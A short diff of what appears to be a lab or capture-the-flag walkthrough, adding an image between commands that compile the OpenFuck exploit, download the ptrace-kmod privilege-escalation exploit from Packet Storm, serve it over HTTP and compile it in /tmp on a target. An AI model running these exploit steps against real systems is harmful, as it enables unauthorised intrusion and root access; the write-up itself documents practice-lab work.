@@ -71,6 +71,10 @@ gcc -o OpenFuck OpenFuck.c -lcrypto
 wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
 mv ptrace-kmod.c ptrace.c
 python3 -m http.server 80
+```
+![10](https://user-images.githubusercontent.com/75953873/177688536-4457928c-35d9-4f25-96c4-e63533b71702.png)
+
+```
 cd /tmp
 gcc -o exploit ptrace.c
 chmod +x exploit
